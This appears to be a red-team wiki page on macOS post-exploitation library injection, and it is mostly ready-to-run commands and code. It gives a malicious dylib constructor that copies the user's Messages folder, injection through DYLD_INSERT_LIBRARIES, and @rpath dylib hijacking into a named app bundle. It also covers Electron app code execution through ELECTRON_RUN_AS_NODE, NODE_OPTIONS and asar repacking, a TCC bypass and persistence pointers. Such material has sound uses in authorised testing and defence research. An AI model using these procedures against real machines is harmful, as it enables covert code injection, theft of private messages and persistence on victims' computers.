---
title: "macOS Library Injection"
type: technique
tags: [macos, injection, evasion, post-exploitation]
phase: post-exploitation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-macos]
---

## Dylib hijacking and DYLD_INSERT_LIBRARIES

Two library-injection primitives. `DYLD_INSERT_LIBRARIES` (macOS equivalent of `LD_PRELOAD`) loads your dylib into a target, but only if the target lacks restricted/hardened protections: it must not be restricted (`cs.restrict`), must not enforce library validation (so it needs `com.apple.security.cs.disable-library-validation`), must allow DYLD env vars (`...allow-dyld-environment-variables`), and must not be SIP/platform restricted. Dylib hijacking instead drops a malicious dylib into a missing `@rpath`-resolved or `LC_LOAD_WEAK_DYLIB` slot that the binary loads but does not validate. The gating entitlements are covered in [[macos-code-signing]].

Malicious dylib with a constructor, and env-var injection:

```c
// gcc -dynamiclib -o inject.dylib inject.c
#include <stdio.h>
__attribute__((constructor))
void run(int argc, const char **argv) {
    printf("[+] dylib injected in %s\n", argv[0]);
    system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```

```bash
gcc -dynamiclib -o inject.dylib inject.c
DYLD_INSERT_LIBRARIES=inject.dylib ./target_binary

# confirm the target lacks library validation first
codesign -dv --entitlements :- ./target_binary 2>&1 | grep disable-library-validation
```

Find a hijackable slot, then build a dylib that runs code and re-exports the real library so functionality is preserved:

```bash
otool -l ./target_binary | grep LC_RPATH -A2      # @rpath search roots
otool -l ./target_binary | grep "@rpath" -A3      # @rpath-loaded libs
find ./ -name lib.dylib                            # which resolved path is MISSING = the slot

gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m \
  -Wl,-reexport_library,"/Applications/App.app/Contents/Resources/lib2/lib.dylib" -o /tmp/lib.dylib
install_name_tool -change @rpath/lib.dylib "/Applications/App.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib
cp /tmp/lib.dylib "/Applications/App.app/Contents/Resources/lib/lib.dylib"   # drop into the missing slot
```

Watch for the constructor firing across the system:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```

## Electron application injection

Electron apps expose Node injection surfaces gated by Electron fuses: `RunAsNode` (gates `ELECTRON_RUN_AS_NODE`), `EnableNodeCliInspectArguments` (gates `--inspect`), `EnableNodeOptionsEnvironmentVariable` (gates `NODE_OPTIONS`), and asar integrity fuses. If a fuse is enabled (many shipped apps leave them on), the app becomes a living-off-the-land Node runtime. Env-var injection generally needs the app to carry `com.apple.security.cs.allow-dyld-environment-variables`.

Read fuses:

```bash
npx @electron/fuses read --app /Applications/Slack.app
```

ELECTRON_RUN_AS_NODE turns the app into a raw Node interpreter:

```bash
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# in the node console:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

NODE_OPTIONS require-file injection and remote debug port:

```bash
echo "require('child_process').execSync('open -a Calculator')" > /tmp/payload.js
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord

/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229   # attach via chrome://inspect
```

Modify `app.asar` for durable JS injection (needs `kTCCServiceSystemPolicyAppBundles`, bypass by copying the app to /tmp first):

```bash
npx asar extract app.asar app-decomp
# edit app-decomp/...
npx asar pack app-decomp app-new.asar
```

Persist via a LaunchAgent that relaunches the app as Node with an inline payload (ProgramArguments `[app, -e, "<js>"]` plus `ELECTRON_RUN_AS_NODE=true`), see [[macos-persistence]]. Tooling: electroniz3r (`inject`), Loki (JS C2). Note child procs inherit the parent's sandbox and TCC grants (see [[macos-tcc]]), and `tccd` does not check app version, so downgrading to an older signed build then injecting is viable. CVE-2024-23738 family covers apps shipping with these fuses enabled.
